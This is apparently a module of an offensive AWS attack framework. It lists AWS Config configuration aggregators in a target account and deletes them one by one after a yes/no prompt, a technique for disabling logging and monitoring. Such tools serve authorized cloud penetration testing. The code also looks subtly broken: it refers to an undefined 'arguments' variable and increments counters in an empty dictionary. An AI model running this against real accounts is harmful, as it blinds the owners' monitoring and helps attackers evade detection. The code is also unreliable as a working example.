#!/usr/bin/env python3
import datetime

import argparse
from copy import deepcopy

def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()
    
    print = awsattack_main.print
    fetch_data = awsattack_main.fetch_data
    get_regions = awsattack_main.get_regions

    config_regions = get_regions('config')

    aggregators = []

    summary_data = {}
    
    tmp_config_regions = set()
    if args.config_aggregators is not None:
        for aggregator in args.config_aggregators.split(','):
            name, region = aggregator.split('@')
            aggregators.append({
                'ConfigurationAggregatorName': name,
                'Region': region
            })
            tmp_config_regions.add(region)

    if len(tmp_config_regions) > 0:
        config_regions = tmp_config_regions

    else:
        config_data = deepcopy(session.Config)

        # If Rules isn't in there, then none of the other stuff has been enumerated either
        if 'Rules' not in config_data:
            if fetch_data(['Logging/Monitoring Data'], technique_info['prerequisite_modules'][0], ' '.join(arguments)) is False:
                print('Pre-req module not run successfully. Only targeting services that currently have valid data...\n')
            else:
                aggregators = deepcopy(session.Config['Aggregators'])
            
        else:
            aggregators = config_data['Aggregators']
        
    if len(aggregators) > 0:
        print('Starting Config aggregators...\n')
        for region in config_regions:
            print('  Starting region {}...\n'.format(region))

            client = awsattack_main.get_boto3_client('config', region)

            for aggregator in aggregators:
                if aggregator['Region'] == region:
                    action = input('    Aggregator Name: {}\n      Do you want to delete this aggregator? (y/n) '.format(aggregator['ConfigurationAggregatorName'])).strip().lower()
                    if action == 'y':
                        try:
                            client.delete_configuration_aggregator(
                                ConfigurationAggregatorName=aggregator['ConfigurationAggregatorName']
                            )
                            print('        Successfully deleted aggregator {}!\n'.format(aggregator['ConfigurationAggregatorName']))
                            summary_data['awsconfig']['aggregators']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete aggregator {}:\n          {}\n'.format(aggregator['ConfigurationAggregatorName'], error))
                    else:
                        print('        Skipping aggregator {}...\n'.format(aggregator['ConfigurationAggregatorName']))
        print('Config aggregators finished.\n')
    else:
        print('No aggregators found. Skipping Config aggregators...\n')

    return summary_data
